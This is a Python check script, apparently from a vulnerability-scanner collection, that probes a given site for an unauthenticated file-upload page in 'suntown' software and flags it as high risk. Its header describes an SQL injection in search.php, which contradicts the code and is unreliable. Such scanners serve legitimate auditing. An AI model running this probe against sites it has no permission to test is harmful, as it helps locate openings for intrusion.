#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: suntown未授权任意文件上传漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-063656
author: Lucifer
description: 文件/zhidao/zhidao/search.php中,参数fulltext存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class suntown_upfile_fileupload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/admini/upfile/upfile.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"PageA_name" in req.text and r"PageA_per" in req.text:
                cprint("[+]存在suntown未授权任意文件上传漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = suntown_upfile_fileupload_BaseVerify(sys.argv[1])
    testVuln.run()